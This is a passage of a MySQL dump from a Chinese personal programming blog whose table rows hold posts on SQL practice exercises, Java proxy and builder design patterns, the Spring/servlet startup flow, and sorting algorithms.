\"张三\") order by score desc limit 1) a \r\nwhere sc.sid = a.sid and sc.cid = a.cid      \r\n```\r\n\r\n40.成绩有重复的情况下，查询选修「张三」老师所授课程的学生中，成绩最高的学生信息及其成绩\r\n\r\n第一种是自己开始做的，做完之后感觉自己短路了，虽然结果没错，但是存在代码冗余。\r\n\r\n第二种为网上版本，由于存在成绩有重复，可以先找出第一名的成绩，再找出和第一名相同的学生即可。\r\n\r\n记录一下\r\n\r\n```sql\r\nselect st.* , sc.score from student st join sc on st.sid = sc.sid, \r\n(select score from sc where cid = (select cid from teacher join course on teacher.tid = course.tid where tname = \"张三\") order by score desc limit 1) a\r\nwhere sc.score = a.score and cid = (select cid from teacher join course on teacher.tid = course.tid where tname = \"张三\");\r\n\r\nselect st.*, sc.score from student st, teacher te ,course co ,sc where st.sid = sc.sid and te.tid = co.tid and sc.cid = co.cid\r\nand te.tname = \"张三\" and sc.score = (\r\nselect max(score) from sc, teacher te, course co where sc.cid = co.cid and te.tid = co.tid and te.tname = \"张三\"\r\n)      \r\n```\r\n\r\n41.查询不同课程成绩相同的学生的学生编号、课程编号、学生成绩\r\n\r\n还是利用自交的方式，最重要的是group by cid, sid。\r\n\r\n```sql\r\nselect sc1.sid, sc1.cid, sc1.score from sc sc1 inner join sc sc2 on sc1.cid != sc2.cid and sc1.score = sc2.score and sc1.sid = sc2.sid group by cid, sid      \r\n```\r\n\r\n42.查询每门功成绩最好的前两名\r\n\r\n同上\r\n\r\n```sql\r\nselect a.cid, a.sid, a.score from sc a left join sc b on \r\na.cid = b.cid and a.score < b.score group by a.cid, a.sid having count(*) < 2 order by a.cid , a.score desc      \r\n```\r\n\r\n43.统计每门课程的学生选修人数（超过 5 人的课程才统计）\r\n\r\n```sql\r\nselect a.cid, a.coursesum from (select cid, count(sid) as coursesum from sc group by cid) a where a.coursesum > 5\r\n\r\nselect cid, count(sid) from sc group by cid having count(sid) > 5      \r\n```\r\n\r\n44.检索至少选修两门课程的学生学号\r\n\r\n在这题上跑偏了，想着先找出选修了两门一下的同学再not in。又短路了\r\n\r\n```sql\r\nselect sid, count(*) from sc group by sid having count(cid) >= 2      \r\n```\r\n\r\n45.查询选修了全部课程的学生信息\r\n\r\n```sql\r\nselect distinct st.* from student st join sc on st.sid = sc.sid where sc.sid in \r\n(\r\nselect sid from sc group by sid having count(*) = (select count(*) from course)\r\n)      \r\n```\r\n\r\n46.查询各学生的年龄，只按年份来算\r\n\r\n从这题开始就是mysql日期函数的使用\r\n\r\n```sql\r\nselect sid, date_format(now(), \"%Y\")-year(sage) from student      \r\n```\r\n\r\n47.按照出生日期来算，当前月日 < 出生年月的月日则，年龄减一\r\n\r\n```sql\r\nselect sid, timestampdiff(year,sage,curdate()) from student;      \r\n```\r\n\r\n48.查询本周过生日的学生\r\n\r\n```sql\r\nselect * from student where weekofyear(sage) = weekofyear(curdate());      \r\n```\r\n\r\n49.查询下周过生日的学生\r\n\r\n```sql\r\nselect * from student where weekofyear(sage) = weekofyear(curdate())+1;      \r\n```\r\n\r\n50.查询本月过生日的学生\r\n\r\n```sql\r\nselect * from student where month(sage) = month(curdate());      \r\n```\r\n\r\n51.查询下月过生日的学生\r\n\r\n```sql\r\nselect * from student where month(sage) = month(curdate())+1;      \r\n```\r\n\r\n## 三、课外题\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200303_153542_462.png)\r\n\r\n**用一条sql语句查出每位用户每天获取到的积分**\r\n\r\n```sql\r\nselect username, date_format(datetime1, \"%Y%m%d\"), sum(score) from jifen group by username, date_format(datetime1, \"%Y%m%d\")\r\n```\r\n\r\n## 四、总结\r\n\r\n1.大多数的sql题都是考察group by的使用，只要group by够熟悉，都能够掌握一般的sql题。外加一些内置函数的学习\r\n\r\n2.拆分题目，解析题干。如果一道题要查询的字段很多，多半是需要通过表关联查出来的。抛去这些字段，我们只要去关心如何查出核心字段即可。', '2020-03-03 15:36:35', '本篇文章来记录一下自己做这50道练习题遇到的问题，也算记录自己的学习记录。其实之前也有做过，只是做到一半就放弃了，这次好好来重新练习一遍。', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/2/20200229_194722_287.jpg', '原创', 0, b'1', b'1', 'mysql 50道经典练习题，学生——老师——课程——分数', '2020-03-12 14:43:08', 21, 55, 2, 0, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000158, b'0', b'0', '前台用户登录注册还在开发中，展示的登录还只是个样式。具体代码还在开发中\r\n\r\n\r\n\r\n\r\n#### 敬请期待....', '2020-03-12 14:48:16', NULL, NULL, NULL, 0, b'0', b'0', '用户登录注册正在开发中！', '2020-03-12 14:48:16', 22, NULL, 2, 0, 0, 1, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000159, b'0', b'0', '###  一、数据结构与算法\r\n- 7个数据结构：数组、链表、栈、队列、二叉树、堆、图\r\n- 10个算法：递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法\r\n### 二、Java基础\r\n- J2SE基础\r\n\r\n	面向对象的思想、Java常用类、[集合框架](https://www.cnblogs.com/syp172654682/p/7994496.html \"集合框架\")、IO、NIO、多线程并发、设计模式、JVM\r\n- J2EE基础\r\n\r\n	Servlet、JSP、JDBC\r\n- 常用框架原理\r\n\r\n	Struts、Hibernate、Spring、Spring MVC、MyBatis\r\n### 三、操作系统\r\n处理器管理、存储器管理、设备管理、文件管理和作业管理\r\n### 四、计算机网络\r\n[TCP/IP协议栈](https://www.islizx.cn/article/149.html \"TCP/IP协议栈\")\r\n### 五、数据库原理\r\nMySQL\r\n### 六、常用中间件原理\r\nRedis\r\n\r\n\r\n\r\n### 资料链接：\r\n[java集合框架常见面试题](https://www.cnblogs.com/iwenwen/p/11052689.html \"java集合框架常见面试题\")', '2020-03-14 12:11:16', '7个数据结构：数组、链表、栈、队列、二叉树、堆、图\r\n10个算法：递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200314_120536_200.jpg', '原创', 0, b'1', b'0', '基础知识梳理', '2020-03-14 21:08:15', 46, 56, 2, 0, 1, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000160, b'0', b'1', '## 一、基本介绍\r\n1.代理模式为一个对象提供一个替身,以控制对这个对象的访问。即通过代理对象访问目标对象,这样做的好处是: 可以在目标对象实现的基础上,增强额外的功能操作,即扩展目标对象的功能\r\n2.被代理的对象可以是远程对象、创建开销大的对象或需要安全控制的对象\r\n3.代理模式有不同的形式,主要有三种**静态代理、动态代理(JDK代理、接口代理)和Cglib代理(可以在内存动态的创建对象,而不需要实现接口,属于动态代理范畴)**\r\n## 二. 静态代理\r\n### 1. 基本介绍\r\n静态代理在使用时,需要定义接口或者父类,被代理对象(即目标对象)与代理对象一起实现相同的接口或者是继承相同父类\r\n### 2. 应用实例\r\n#### (1)需求\r\ni. 定义一个接口ITeacherDAO\r\nii. 目标对象TeacherDAO实现接口ITeacherDAO\r\niii. 使用静态代理方式,就需要在代理对象TeacherDAOProxy中也实现ITeacherDAO\r\niiii. 调用的时候通过调用代理对象的方法来调用目标对象\r\niiiii. 特别提醒: 代理对象与目标对象需要实现相同的接口,然后通过调用相同的方法来调用目标对象的方法\r\n#### (2)类图\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200316_113814_821.png)\r\n#### (3)代码\r\n```java\r\n// 接口 \r\npublic interface ITeacherDao {\r\n    void teach();\r\n}\r\n\r\n// 被代理对象,接口实现类\r\npublic class TeacherDao implements ITeacherDao {\r\n    @Override\r\n    public void teach() {\r\n        System.out.println(\"老师授课中...\");\r\n    }\r\n}\r\n\r\n// 代理对象,静态代理\r\npublic class TeacherDaoProxy implements ITeacherDao {\r\n    private ITeacherDao target; //目标对象,通过接口来聚合\r\n    public TeacherDaoProxy(ITeacherDao target) {\r\n        this.target = target;\r\n    }\r\n    @Override\r\n    public void teach() {\r\n        System.out.println(\"开始代理...\");\r\n        target.teach();\r\n        System.out.println(\"代理结束...\");\r\n    }\r\n}\r\n\r\n\r\npublic class Client {\r\n    public static void main(String[] args) {\r\n        //创建目标对象(被代理对象)\r\n        TeacherDao teacherDao = new TeacherDao();\r\n        //创建代理对象,同时将被代理对象传递给代理对象\r\n        TeacherDaoProxy teacherDaoProxy = new TeacherDaoProxy(teacherDao);\r\n        //执行代理对象方法\r\n        teacherDaoProxy.teach();\r\n    }\r\n}\r\n\r\n//输出结果\r\n开始代理...\r\n老师授课中...\r\n代理结束...\r\n```\r\n### 3. 优缺点\r\n(1)优点: 在不修改目标对象的功能前提下,能通过代理对象对目标功能扩展\r\n(2)缺点: 因为代理对象需要与目标对象实现一样的接口,所以会有很多代理类。一旦接口增加方法,对目标对象与代理对象都要维护\r\n## 三. 动态代理\r\n### 1. 基本介绍\r\n(1) 代理对象,不需要实现接口,但是目标对象要实现接口,否则不能使用动态代理\r\n(2) 代理对象的生成,是利用JDK的API,动态地在内存中构建代理对象\r\n(3) 动态代理也叫: JDK代理、接口代理\r\n\r\n### 2. 应用案例\r\n利用前面的静态代理改进成动态代理模式\r\n#### (1)类图\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200316_115012_220.png)\r\n#### (2)代码\r\nITeacherDao接口和TeacherDao实现类与上面一致,这里省略\r\n```java\r\n// 动态代理工厂类\r\npublic class ProxyFactory {\r\n    //存放目标接口的实现类\r\n    private Object target;\r\n    public ProxyFactory(Object target){\r\n        this.target = target;\r\n    }\r\n    //给目标对象生成一个代理对象\r\n    /**\r\n     *     public static Object newProxyInstance(ClassLoader loader,\r\n                Class<?>[] interfaces,\r\n                InvocationHandler h)\r\n     * 说明\r\n     * 1. ClassLoader loader : 指定当前目标对象使用的类加载器,获取加载器的方法固定\r\n     * 2. Class<?>[] interfaces : 目标对象实现的接口类型,使用泛型方法确认类型\r\n     * 3. InvocationHandler h : 事情处理,执行目标对象的方法时,会触发事情处理器方法,会把当前执行的目标对象方法作为参数传入\r\n     */\r\n    public Object getProxyInstance(){\r\n        return Proxy.newProxyInstance(target.getClass().getClassLoader(),\r\n                target.getClass().getInterfaces(),\r\n                new InvocationHandler() {\r\n                    @Override\r\n                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\r\n                        System.out.println(\"JDK代理开始 ...\");\r\n                        //反射机制调用目标对象方法\r\n                        Object returnVal = method.invoke(target, args);\r\n                        System.out.println(\"JDK代理结束 ...\");\r\n                        return returnVal;\r\n                    }\r\n                }\r\n        );\r\n    }\r\n}\r\n\r\n\r\npublic class Client {\r\n    public static void main(String[] args) {\r\n        //创建目标对象\r\n        ITeacherDao target = new TeacherDao();\r\n\r\n        //给目标对象,创建代理对象,可以转成ITeacherDao\r\n        ITeacherDao proxyInstance = (ITeacherDao) new ProxyFactory(target).getProxyInstance();\r\n\r\n        //内存中动态生成了代理对象 proxyInstance = class com.sun.proxy.$Proxy0\r\n        System.out.println(\"proxyInstance = \" + proxyInstance.getClass());\r\n\r\n        //通过代理对象,调用目标对象的方法\r\n        proxyInstance.teach();\r\n    }\r\n}\r\n\r\n//输出结果\r\nproxyInstance = class com.sun.proxy.$Proxy0\r\nJDK代理开始 ...\r\n老师授课中...\r\nJDK代理结束 ...\r\n```\r\n## 四. Cglib代理\r\n### 1. 基本介绍\r\n(1) 目标对象无需实现任何接口,可以使用目标对象子类来实现代理\r\n(2) Cglib代理也叫子类代理,它是在内存中构建一个子类对象从而实现对目标对象功能扩展,有些书也将Cglib代理归属到动态代理\r\n(3) Cglib是一个强大的高性能代码生成包,它可以在运行期扩展Java类与实现Java接口。它广泛被许多AOP框架使用,例如Spring AOP实现方法拦截\r\n(4) 在AOP编程中如何选择代理模式:\r\n1. 目标对象需要实现接口,使用JDK代理\r\n2. 目标对象不需要实现接口,使用Cglib代理\r\n\r\n(5) Cglib包底层时通过使用字节码处理框架ASM来转换字节码并生成新的类\r\n### 2. 应用案例\r\n#### (1)类图\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200316_120322_100.png)\r\n#### (2)代码\r\n```java\r\n<!-- 需要使用到的jar包 -->\r\n<dependency>\r\n    <groupId>cglib</groupId>\r\n    <artifactId>cglib</artifactId>\r\n    <version>3.1</version>\r\n</dependency>\r\n\r\n// 目标对象,无需实现接口了\r\npublic class TeacherDao {\r\n    public void teach() {\r\n        System.out.println(\"老师授课中...\");\r\n    }\r\n}\r\n\r\n// Cglib 动态代理\r\npublic class ProxyFactory implements MethodInterceptor{\r\n    private Object target;\r\n    public ProxyFactory(Object target){\r\n        this.target = target;\r\n    }\r\n    //返回一个代理对象,是target对象的代理对象\r\n    public Object getProxyInstance(){\r\n        //1.创建一个工具类\r\n        Enhancer enhancer = new Enhancer();\r\n        //2.设置父类\r\n        enhancer.setSuperclass(target.getClass());\r\n        //3.设置回调函数\r\n        enhancer.setCallback(this);\r\n        //4.创建子类对象,即代理对象\r\n        return enhancer.create();\r\n    }\r\n    //重写intercept方法,会调用目标对象的方法\r\n    @Override\r\n    public Object intercept(Object o, Method method, Object[] args, MethodProxy methodProxy) throws Throwable {\r\n        System.out.println(\"Cglib代理模式开始 ...\");\r\n        Object returnVal = method.invoke(target, args);\r\n        System.out.println(\"Cglib代理模式结束 ...\");\r\n        return returnVal;\r\n    }\r\n}\r\n\r\n\r\npublic class Client {\r\n    public static void main(String[] args) {\r\n        TeacherDao teacherDao = new TeacherDao();\r\n        ProxyFactory proxyFactory = new ProxyFactory(teacherDao);\r\n        TeacherDao proxyInstance = (TeacherDao) proxyFactory.getProxyInstance();\r\n        proxyInstance.teach();\r\n    }\r\n}\r\n\r\n//输出结果\r\nCglib代理模式开始 ...\r\n老师授课中...\r\nCglib代理模式结束 ...\r\n```\r\n', '2020-03-16 12:07:02', '代理模式为一个对象提供一个替身,以控制对这个对象的访问。即通过代理对象访问目标对象,这样做的好处是: 可以在目标对象实现的基础上,增强额外的功能操作,即扩展目标对象的功能', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200314_120536_200.jpg', '原创', 0, b'1', b'0', '代理设计模式', '2020-03-16 12:07:02', 11, 57, 2, 0, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000161, b'0', b'1', '## 前言\r\n如果你的spring项目部署在tomcat服务器上，那么tomcat启动，servlet容器随之启动，读取service.xml配置文件，启动里面配置的web应用，为每个应用创建一个ServletContext（全局上下文环境），接着创建Spring容器、SpringMVC容器。\r\n本文将简述Web容器、Servlet容器、Spring容器、SpringMVC容器之间的关系，以及spring的启动流程。\r\n## servlet\r\nservlet是sun公司为开发动态web而提供的一门技术，用户若想用发一个动态web资源(即开发一个Java程序向浏览器输出数据)，需要完成以下2个步骤：\r\n1. 编写一个Java类，实现servlet接口。\r\n2. 把开发好的Java类部署到web服务器中。按照一种约定俗成的称呼习惯，通常我们也把实现了servlet接口的java程序，称之为Servlet。\r\n\r\n## web容器\r\nweb容器（web服务器）主要有：Apache、IIS、Tomcat、Jetty、JBoss、webLogic等，这些服务器同时也是servlet容器，因为它们包含了servlet容器。没有servlet容器，也可以用web容器直接访问静态页面。**但是如果要显示jsp/servlet，就需要安装一个servlet容器，但是光有servlet容器是不够的，因为它要被解析成html输出，所以你仍需要一个web容器。大多数servlet容器同时提供了web容器的功能，也就是说大多servelt容器可以独立运行你的web应用。**\r\n\r\n** web容器是管理servlet（通过servlet容器），以及监听器(Listener)和过滤器(Filter)的。**这些都是在web容器的掌控范围里。但他们不在spring和springmvc的掌控范围里。因此，我们无法在这些类中直接使用Spring注解的方式来注入我们需要的对象，是无效的，web容器是无法识别的。\r\n## Servlet容器\r\nServlet容器是管理servlet对象的。\r\n## Spring容器\r\nSpring容器是管理service和dao的。\r\n## SpringMVC容器\r\nSpringMVC容器是管理controller对象的。\r\n\r\nSpring容器和SpringMVC容器的关系是父子容器的关系。Spring容器是父容器，SpringMVC容器是子容器。在子容器里可以访问父容器里的对象，但是在父容器里不可以访问子容器的对象。\r\n## Servlet容器和ServletContext的关系\r\nServletContext是servlet与servlet容器之间的直接通信的接口。Servlet容器在启动一个Web应用时，会为它创建一个servletContext对象。**每个web应用有唯一的servletContext对象。同一个web应用的所有servlet对象共享一个serveltContext,servlet对象可以通过它来访问容器中的各种资源。 **\r\n\r\n## servlet的运行过程\r\n1.浏览器发出请求，被web容器获取到\r\n\r\n2.Web服务器首先检查是否已经装载并创建了该Servlet的实例对象。\r\n\r\n3.如果没有则装载并创建该Servlet的一个实例对象，调用Servlet实例对象的init()方法。\r\n\r\n4.创建一个用于封装HTTP请求消息的HttpServletRequest对象和一个代表HTTP响应消息的HttpServletResponse对象，然后调用Servlet的service()方法并将请求和响应对象作为参数传递进去。\r\n\r\n5.WEB应用程序被停止或重新启动之前，Servlet引擎将卸载Servlet，并在卸载之前调用Servlet的destroy()方法。\r\n\r\n## web.xml\r\n```xml\r\n<!--加载spring容器-->\r\n<context-param>\r\n	<param-name>contextConfigLocation</param-name>\r\n	<param-value>\r\n		classpath:spring/spring-*.xml,\r\n	</param-value>\r\n</context-param>\r\n<!--配置监听器，来加载spring容器-->\r\n<listener>\r\n	<listener-class>\r\n		org.springframework.web.context.ContextLoaderListener\r\n	</listener-class>\r\n</listener>\r\n\r\n<!--springmvc前端控制器 -->\r\n<servlet>\r\n	<servlet-name>Blog</servlet-name>\r\n	<servlet-class>com.islizx.exception.MyDispatcherServlet</servlet-class>\r\n	<init-param>\r\n		<param-name>contextConfigLocation</param-name>\r\n		<param-value>classpath:spring/spring-mvc.xml</param-value>\r\n	</init-param>\r\n</servlet>\r\n<servlet-mapping>\r\n	<servlet-name>Blog</servlet-name>\r\n	<url-pattern>/</url-pattern>\r\n	<url-pattern>*.js</url-pattern>\r\n	<url-pattern>*.css</url-pattern>\r\n	<url-pattern>*.img</url-pattern>\r\n	<url-pattern>*.html</url-pattern>\r\n</servlet-mapping>\r\n```\r\n\r\n## web容器的加载过程：\r\n1.启动web项目后，web容器首先回去找web.xml文件，读取<context-param>和<listener>两个节点。\r\n\r\n2.容器会创建一个 ServletContext （ servlet 上下文），并将web.xml中的属性设置到Context容器中。整个 web 项目的所有部分都将共享这个上下文。\r\n\r\n3.容器将<context-param>转换为键值对，并交给 servletContext。因为listener, filter 等在初始化时会用到这些上下文中的信息，所以要先加载。\r\n\r\n4.容器创建<listener>中的类实例，创建监听器。\r\n\r\n5.容器加载filter，创建过滤器， 要注意对应的filter-mapping一定要放在filter的后面。\r\n\r\n6.容器加载servlet，加载顺序按照 Load-on-startup 来执行\r\n\r\n**web.xml组件加载顺序：context-param -> listener -> filter -> servlet**\r\n\r\n## spring的启动流程\r\n1.启动web项目后，web容器首先回去找web.xml文件，读取<context-param>和<listener>两个节点。\r\n\r\n2.其中<context-param>节点中是contextConfigLocation初始化上下文，<listener>节点加载配置文件，其中调用的spring包中的`ContextLoaderListener`这个上下文监听器，`ContextLoaderListener`是一个实现了`ServletContextListener`接口的监听器，他的父类是  `ContextLoader`，在启动项目时会触发`contextInitialized`上下文初始化方法。这个方法又调用了父类`ContextLoader`的`initWebApplicationContext(event.getServletContext())`方法。该方法主要做了三件事：\r\n创建了WebApplicationContext，加载对应的spring配置文件中的Bean，将WebApplicationContext放入ServletContext（Java Web的全局变量）中。\r\n\r\n3.如果配置了springmvc，则会创建SpringMVC容器实例。调用web.xml中配置的servlet-class，为其初始化自己的上下文信息，并加载其设置的配置信息到该上下文中。将WebApplicationContext设置为它的父容器。\r\n\r\n**总结来说如下图所示**\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200317_220428_983.JPG)\r\n\r\n**2020-03-17 22:07:02 星期二**', '2020-03-17 22:13:01', 'tomcat启动，servlet容器随之启动，读取service.xml配置文件，启动里面配置的web应用，为每个应用创建一个ServletContext（全局上下文环境），接着创建Spring容器、SpringMVC容器。\r\n本文将简述Web容器、Servlet容器、Spring容器、SpringMVC容器之间的关系，以及spring的启动流程', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200317_221225_32.jpg', '原创', 0, b'1', b'0', 'Spring的启动流程以及各种容器之间的关系', '2020-03-17 22:20:49', 17, 58, 2, 0, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000162, b'0', b'1', '## 前言\r\n排序算法在算法中很常见,是数据处理中十分常见且核心的操作，也是最经典的算法之一。所以本文基本排序算法进行了整理。\r\n\r\n## 选择排序\r\n选择排序是最简单直观的一种算法，基本思想为每一趟从待排序的数据元素中选择最小（或最大）的一个元素作为首元素，直到所有元素排完为止，简单选择排序是不稳定排序。\r\n\r\n### **原理：**\r\n(1) 从未排序序列中选出最小(或大)元素 , 存放在序列起始位置 , 作为已排序序列。\r\n\r\n(2) 从未排序序列中选出最小(或大)元素 , 存放在已排序序列的末尾。\r\n\r\n(3) 重复(2)直到未排序序列元素个数为零。\r\n\r\n### **代码实现**\r\n```java\r\npublic static void selectSort(int[] arr) {\r\n	for (int i = 0; i < arr.length - 1; i++) {\r\n		int min = i;\r\n		for (int j = i + 1; j < arr.length; j++) {\r\n			if (arr[j] < arr[min]) {\r\n				min = j;\r\n			}\r\n		}\r\n		if (min != i) {\r\n			swap(arr,min,i);\r\n		}\r\n	}\r\n}\r\n```\r\n\r\n### **时间复杂度和稳定性**\r\n**时间复杂度:O(N2)**\r\n**算法稳定性:不稳定**\r\n\r\n对于比较操作，无论原始数组如何排布，比较次数是不变的。\r\n\r\n对于交换操作，在最理想的情况下也就是数据本身有序，无需任何交换移动。在最差情况下，数组倒序的时候，交换次数为n-1次\r\n\r\n## 冒泡排序法\r\n### **原理：**\r\n冒泡排序法每一轮排序都是在比较相邻的元素 , 若前一个元素比后一个元素大 , 就交换两个元素 , 反之不变。\r\n在冒泡排序中，如果外循环一次没有进行过交换操作，则说明数组已经完全有序。此时只要跳出循环即可\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200319_132124_604.png)\r\n\r\n### **代码实现：**\r\n```java\r\npublic static void bubbleSort(int[] arr) {\r\n	for(int i = 0; i < arr.length; i++){\r\n		boolean flag = true;\r\n		for(int j = 0;j < arr.length-1-i;j++){\r\n			if(arr[j] > arr[j+1]){\r\n				swap(arr, j, j+1);\r\n				flag = false;\r\n			}\r\n		}\r\n		if(flag){\r\n			break;\r\n		}\r\n	}\r\n}\r\n```\r\n### **时间复杂度和稳定性**\r\n**时间复杂度:O(N2)**\r\n\r\n在最理想的情况下，即数组本身有序，仅需n-1次比较就可完成；\r\n但如果是倒序，遍历次数是 (n-1)+(n-2)+…+2+1 = n*(n-1)/2 = 0.5*n2-0.5*n，所以时间复杂度是O(N2)。\r\n\r\n**算法稳定性:稳定**\r\n\r\n在比较arr[j]和arr[j+1]时 , 可以不交换两个值 , 排完序的元素相对顺序不会变化 , 所以冒泡排序是稳定的\r\n\r\n## 插入排序\r\n### **原理：**\r\n把待排序的记录按照元素大小逐个插入到一个已经排好序的有序序列中 , 直到所有的记录插入完位置 , 得到一个新的有序序列。\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200319_134115_224.png)\r\n\r\n### **代码实现：**\r\n```java\r\npublic static void insertionSort(int[] arr) {\r\n	for(int i = 0; i < arr.length; i++){\r\n		int j = i;\r\n		// while循环做的事就是将要插入的数字与部分排好序的数据逐一比较，直到找到合适的位置\r\n		while(j > 0 && arr[j] < arr[j - 1]){\r\n			swap(arr, j, j-1);\r\n			j--;\r\n		}\r\n	}\r\n}\r\n```\r\n### **时间复杂度和稳定性**\r\n**时间复杂度: 最佳情况O(N) , 最差情况O(N2)**\r\n\r\n(1) 当初始序列为正序时，只需要外循环N-1次，每次进行一次比较，无需移动元素。\r\n此时时间复杂度为O(N)。\r\n\r\n(2) 当初始序列为反序时，需要外循环N-1次，每次排序中待插入的元素都要和[0,i-1]中的i个元素进行比较且要将这i个元素后移i次，如果使用了tmp，加上tmp=arr[i]与arr[j]=temp的两次移动，每趟移动次数为i+2,此时比较次数和移动次数达到最大值。\r\n\r\n= 1+2+…+(n-1) = n(n-1)/2\r\n= (1+2）+ （2+2）+…+（n-1+2）=（n-1）(n+4)/2\r\n\r\n此时时间复杂度O(N2)。\r\n\r\n**算法稳定性:稳定**\r\n\r\n相等元素的前后顺序没有改变 ，从原无序序列出去的顺序就是排好序后的顺序 ，所以插入排序是稳定的。\r\n\r\n## 希尔排序\r\n## 快速排序\r\n## 归并排序\r\n## 堆排序\r\n\r\n**2020-03-19 14:09:23 星期四**\r\n\r\n**未完待续...**', '2020-03-19 14:11:10', '排序算法在算法中很常见,是数据处理中十分常见且核心的操作，也是最经典的算法之一。所以本文基本排序算法进行了整理', 'https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200314_120536_200.jpg', '原创', 0, b'1', b'0', '排序算法', '2020-03-19 14:12:59', 10, 59, 2, 0, 0, 0, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000163, b'0', b'1', '## 一、基本介绍\r\n1.建造者模式(Builder Pattern)又叫生成器模式,是一种对象构建模式。它可以将复杂对象的建造过程抽象出来,是这个抽象过程的不同实现方法可以构造出不同表现的对象\r\n\r\n2.构造这模式是一步一步创建一个复杂的对象,它允许用户只通过指定复杂对象的类别和内容就可以构建它们,用户不需要知道内部的具体构建细节\r\n## 二、角色\r\n### 1. Product\r\n产品角色,一个具体产品对象\r\n\r\n### 2. Builder\r\n抽象建造者,创建一个Product对象的各个部件指定的接口\r\n\r\n### 3. ConcreteBuilder\r\n具体建造者,实现接口,构造和装配各个部件\r\n\r\n### 4. Director\r\n指挥者,构建一个使用Builder接口的对象,它主要是用于创建一个复杂的对象。它主要有两个作用,一是:隔离了客户与对象生产的过程,二是:负责控制产品对象的生产过程\r\n\r\n## 三、类图\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200320_121218_136.png)\r\n\r\n## 四、例子\r\n**造房子:**\r\n建房子的流程大概是 打地基 - 砌墙 - 盖顶\r\n无论建小房子还是高楼都是这个顺序,故我们采用建造者模式\r\n\r\n**类图：**\r\n\r\n![](https://islizx.oss-cn-hangzhou.aliyuncs.com/images/2020/3/20200320_121218_354.png)\r\n\r\n**代码实现：**\r\n1.Product\r\n```java\r\npublic class House {\r\n    private String baise;\r\n    private String wall;\r\n    private String roofed;\r\n}\r\n```\r\n2.Builder\r\n```java\r\npublic abstract class HouseBuilder {\r\n    protected House house = new House();\r\n    //将建造流程写好,抽象的方法\r\n    public abstract void buildBasic();\r\n    public abstract void buildWalls();\r\n    public abstract void roofed();\r\n    //建造房子\r\n    public House buildHouse(){\r\n        return house;\r\n    }\r\n}\r\n```\r\n3.ConcreteBuilder\r\n```java\r\n// 高楼建造子类\r\npublic class HighBuilding extends HouseBuilder{\r\n    @Override\r\n    public void buildBasic() {\r\n        System.out.println(\"高楼打地基100米\");\r\n    }\r\n    @Override\r\n    public void buildWalls() {\r\n        System.out.println(\"高楼砌墙150米\");\r\n    }\r\n    @Override\r\n    public void roofed() {\r\n        System.out.println(\"高楼屋顶盖好\");\r\n    }\r\n}\r\n\r\n// 平房建造子类\r\npublic class CommonHouse extends HouseBuilder {\r\n    @Override\r\n    public void buildBasic() {\r\n        System.out.println(\"普通房子打地基5米\");\r\n    }\r\n    @Override\r\n    public void buildWalls() {\r\n        System.out.println(\"普通房子砌墙3米\");\r\n    }\r\n    @Override\r\n    public void roofed() {\r\n        System.out.println(\"普通房子屋顶盖好\");\r\n    }\r\n}\r\n```\r\n4.Director\r\n```java\r\n// 指挥者,指定制作流程,返回产品\r\npublic class HouseDirector {\r\n    HouseBuilder houseBuilder = null;\r\n    public HouseDirector(HouseBuilder houseBuilder) {\r\n        this.houseBuilder = houseBuilder;\r\n    }\r\n    public void setHouseBuilder(HouseBuilder houseBuilder) {\r\n        this.houseBuilder = houseBuilder;\r\n    }\r\n    //如何处理建造房子的流程,交给指挥者\r\n    public House constructHouse(){\r\n        houseBuilder.buildBasic();\r\n        houseBuilder.buildWalls();\r\n        houseBuilder.roofed();\r\n        return houseBuilder.buildHouse();\r\n    }\r\n}\r\n```\r\n5.主类\r\n```java\r\npublic class Client {\r\n    public static void main(String[] args) {\r\n        //盖普通房子\r\n        CommonHouse commonHouse = new CommonHouse();\r\n        //创建指挥者\r\n        HouseDirector houseDirector = new HouseDirector(commonHouse);\r\n        //完成盖房子\r\n        House house = houseDirector.constructHouse();\r\n\r\n        //盖高楼\r\n        HighBuilding highBuilding = new HighBuilding();\r\n        //重置建造者\r\n        houseDirector.setHouseBuilder(highBuilding);\r\n        //完成盖高楼\r\n        House hightHouse = houseDirector.constructHouse();\r\n    }\r\n}\r\n```\r\n## 总结\r\n### 优点：\r\n1.客户端不必知道产品内部组成细节,将产品本身与产品的创建过程解耦,使得相同的创建过程可以创建不同的产品对象\r\n\r\n2.用户使用不同的具体建造者即可得到不同的产品对象\r\n\r\n3.可以更精细地控制产品地创建过程\r\n\r\n4.增加新的具体建造者无需修改原有类库地代码,符合OCP原则\r\n\r\n### 缺点：\r\n1.若产品间差异性很大,则不适合使用建造者模式,而房子地建造步骤基本一致\r\n\r\n2.若产品地内部变化复杂,要考虑这种情况并权衡是否选择建造者模式\r\n\r\n## 对比抽象工厂模式\r\n抽象工厂模式实现堆产品家族地创建,一个产品家族是这样一系列产品:具有不同分类维度地产品组合,采用抽象工厂模式不需要关心构建过程,只关心什么产品由什么工厂生产即可\r\n\r\n建造者模式则是要求按照指定蓝图构建产品,它的主要目的是通过组装零配件而产生一个新产品\r\n\r\n**2020-03-20 12:19:13 星期五**', '2020-03-20 